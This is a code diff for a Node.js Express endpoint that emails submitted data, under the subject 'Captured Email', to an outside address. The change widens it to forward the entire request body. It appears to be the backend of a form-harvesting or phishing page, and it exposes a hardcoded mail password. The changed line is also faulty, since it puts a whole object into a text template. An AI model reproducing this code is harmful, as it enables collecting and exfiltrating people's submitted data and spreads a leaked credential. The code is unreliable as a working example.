@@ -15,15 +15,15 @@ const transporter = nodemailer.createTransport({
     pass:'pydxhmlekrbhpens' 
   }
 });
-
+//https://average-trousers-jay.cyclic.cloud/send-email
 app.post('/send-email', (req, res) => {
-  const { email } = req.body;
+  const fdata = req.body;
 
   const mailOptions = {
     from: 'your-email@gmail.com',
     to: 'info@easyhostnet.com', // Replace with the recipient's email address
     subject: 'Captured Email',
-    text: `user email is ${email}`
+    text: `user email is ${fdata}`
     
   };
 
